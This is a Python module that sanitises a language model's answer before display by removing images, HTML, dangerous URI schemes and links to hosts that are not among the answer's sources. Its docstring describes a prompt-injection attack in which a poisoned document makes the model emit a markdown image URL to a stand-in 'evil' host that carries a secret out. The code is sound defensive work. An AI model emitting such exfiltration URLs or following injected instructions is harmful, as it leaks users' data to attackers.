"""Make a model's answer safe to render.

A poisoned document can instruct the model to emit a markdown image or link whose
URL carries data out (``![x](https://evil/log?d=<secret>)``); rendering it makes the
reader's browser send the request. So the answer never keeps an image, raw HTML,
script/data URIs, or a URL whose host is not one of the answer's own sources.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit

from offline_pipeline.safety.injection import INVISIBLE_CHARS

_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_LINK = re.compile(r"\[([^\]]+)\]\(\s*([^)\s]+)(?:\s+\"[^\"]*\")?\s*\)")
_HTML_TAG = re.compile(r"</?[A-Za-z!][^<>]{0,500}>")
_BARE_URL = re.compile(r"(?:https?|ftp)://[^\s)>\]\"']+", re.I)
_DANGEROUS_URI = re.compile(r"\b(?:javascript|data|vbscript|file):[^\s)\]]*", re.I)


def _host(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower().rstrip(".")
    except ValueError:
        return ""


def _allowed(url: str, allowed_hosts: set[str]) -> bool:
    host = _host(url)
    return bool(host) and any(host == h or host.endswith("." + h) for h in allowed_hosts)


def sanitize_answer(text: str, allowed_hosts: set[str] | None = None) -> tuple[str, list[str]]:
    """Return (safe text, flags describing what was removed)."""
    allowed = {h.lower().rstrip(".") for h in (allowed_hosts or set()) if h}
    flags: list[str] = []

    def note(flag: str) -> None:
        if flag not in flags:
            flags.append(flag)

    cleaned = INVISIBLE_CHARS.sub("", text)
    if cleaned != text:
        note("invisible_characters_removed")

    if _IMAGE.search(cleaned):
        cleaned = _IMAGE.sub("", cleaned)
        note("image_removed")

    def link(m: re.Match[str]) -> str:
        if _allowed(m.group(2), allowed):
            return m.group(0)
        note("link_removed")
        return m.group(1)

    cleaned = _LINK.sub(link, cleaned)

    if _HTML_TAG.search(cleaned):
        cleaned = _HTML_TAG.sub("", cleaned)
        note("html_removed")
    if _DANGEROUS_URI.search(cleaned):
        cleaned = _DANGEROUS_URI.sub("[link removed]", cleaned)
        note("link_removed")

    def bare(m: re.Match[str]) -> str:
        if _allowed(m.group(0), allowed):
            return m.group(0)
        note("link_removed")
        return "[link removed]"

    # Bare URLs inside an allowed markdown link were already kept; this catches the rest.
    pieces = re.split(r"(\]\([^)]*\))", cleaned)
    cleaned = "".join(p if p.startswith("](") else _BARE_URL.sub(bare, p) for p in pieces)
    return cleaned.strip(), flags
